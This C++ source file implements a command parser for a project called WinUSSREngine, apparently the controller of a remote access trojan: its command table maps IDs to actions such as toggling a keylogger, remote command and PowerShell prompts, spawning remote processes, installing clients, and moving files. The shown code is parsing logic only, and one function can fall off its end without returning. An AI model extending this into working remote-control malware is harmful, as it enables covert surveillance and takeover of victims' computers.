#include "AppCmdParser.h"
#include "Config.h"

namespace WinUSSREngine
{
	AppCmdParser::AppCmdParser() { }

	AppCmdParser::~AppCmdParser() { clear(); }

	void AppCmdParser::initCmdHandler() { addCmdsByList(config->cmdStrings.CommandList); }

	void AppCmdParser::setPrefix(const std::string& prefix)
	{
		m_prefix = prefix;
		for (unsigned int i = 0; i < m_cmdBuffer.size(); ++i)
		{
			std::string cmd = m_cmdBuffer[i].cmdName;
			if (i != 0)
			{
				cmd[0] = m_prefix[0];
				m_cmdBuffer[i].cmdName = cmd;
			}
		}
	}

	void AppCmdParser::addCmdsByName(const std::string& cmdName)
	{
		CData cmds = CData();
		cmdName.c_str()[0] != m_prefix.c_str()[0] ?
			cmds.cmdName = m_prefix + cmdName
			: cmds.cmdName = cmdName;
		cmds.cmdId = ++m_CmdIds;
		m_cmdBuffer.push_back(cmds);
	}

	void AppCmdParser::addCmdsByList(std::vector<std::string> cmdList)
	{
		for (auto& cmds : cmdList)
		{
			int id = ++m_CmdIds;
			cmds.c_str()[0] != m_prefix.c_str()[0] ?
				cmds = m_prefix + cmds : cmds;
			m_cmdBuffer.push_back({ cmds,id });
		}
	}

	void AppCmdParser::writeCommandsToFile(const std::string& fname)
	{
		m_cmdsFile.open(fname, std::fstream::out);
		for (unsigned int i = 0; i < m_cmdBuffer.size(); ++i)
		{
			m_cmdsFile.write(m_cmdBuffer[i].cmdName.c_str(), m_cmdBuffer[i].cmdName.size());
			m_cmdsFile.write("\n", sizeof(char));
		}
		m_cmdsFile.close();
	}

	void AppCmdParser::readCommandsFromFile(const std::string& fname)
	{
		m_cmdsFile.open(fname, std::fstream::in);
		while (m_cmdsFile.good())
		{
			std::string line;
			int id = ++m_CmdIds;
			std::getline(m_cmdsFile, line);
			m_cmdBuffer.push_back({ line, id });
		}
		m_cmdsFile.close();
	}

	int AppCmdParser::commandIdByName(const std::string& cmdName)
	{
		for (unsigned int i = 0; i < m_cmdBuffer.size(); i++)
		{
			if (m_cmdBuffer[i].cmdName == cmdName)
				return m_cmdBuffer[i].cmdId;
		}
		return (-1);
	}

	int AppCmdParser::commandById(int id)
	{
		for (unsigned int i = 0; i < m_cmdBuffer.size(); ++i)
		{
			if (m_cmdBuffer[i].cmdId == id)
				return m_cmdBuffer[i].cmdId;
		}
		return InvalidClientCmd;
	}

	std::string AppCmdParser::commandNameById(int Id)
	{
		if (Id == -1) return "Invalid Client Cmd!";
		for (unsigned int i = 0; i < m_cmdBuffer.size(); ++i)
		{
			if (m_cmdBuffer[i].cmdId == Id)
				return m_cmdBuffer[i].cmdName;
		}
	}

	const std::string& AppCmdParser::prefix() const noexcept { return m_prefix; }

	void AppCmdParser::clear()
	{
		m_CmdIds -= m_CmdIds;
		m_cmdBuffer.clear();
	}

	void AppCmdParser::reset()
	{
		m_prefix = "$";
		m_CmdIds -= m_CmdIds; // ++i -= i results in i = 1. 
		m_cmdBuffer.clear();

	}

	int AppCmdParser::determineCommand(std::string cmdName)
	{
		switch (commandIdByName(cmdName))
		{
		case 1:	   return DisableAll;		 break;
		case 2:    return ToggleKeylogger;	 break;
		case 3:    return RemoteCmdPrompt;	 break;
		case 4:	   return RemotePws32;		 break;
		case 5:	   return RemotePws64;		 break;
		case 6:    return SpawnRemoteProc;	 break;
		case 7:	   return KillClient;		 break;
		case 8:    return RestartClientCmd;	 break;
		case 9:	   return ListClients;		 break;
		case 10:   return ConnectToClient;	 break;
		case 11:   return SwitchSessionCmd;	 break;
		case 12:   return ExitSessionCmd;	 break;
		case 13:   return DisconnectClient;	 break;
		case 14:   return CloseAppCommand;	 break;
		case 15:   return DownloadFileCmd;	 break;
		case 16:   return UploadFileCmd;	 break;
		case 17:   return BroadCastToAll;	 break;
		case 18:   return InstallClient;	 break;
		case 19:   return Help;				 break;
		case 20:   return ToggleKeyboard;	 break;
		default: return InvalidClientCmd;
		}
	}
}